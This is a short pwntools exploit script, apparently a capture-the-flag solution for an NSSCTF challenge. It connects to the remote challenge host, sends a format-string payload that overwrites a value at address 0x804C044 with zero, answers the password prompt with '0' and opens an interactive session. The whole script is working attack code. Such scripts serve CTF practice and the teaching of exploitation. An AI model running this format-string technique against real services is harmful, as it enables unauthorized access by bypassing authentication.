from pwn import *
context(arch='x86')

# io=process("./pwn")
io=remote("node3.anna.nssctf.cn",28466)

payload=fmtstr_payload(10,{0x804C044:0x0})
io.sendafter(b"name:",payload)
io.sendafter(b"wd:",b"0")


io.interactive()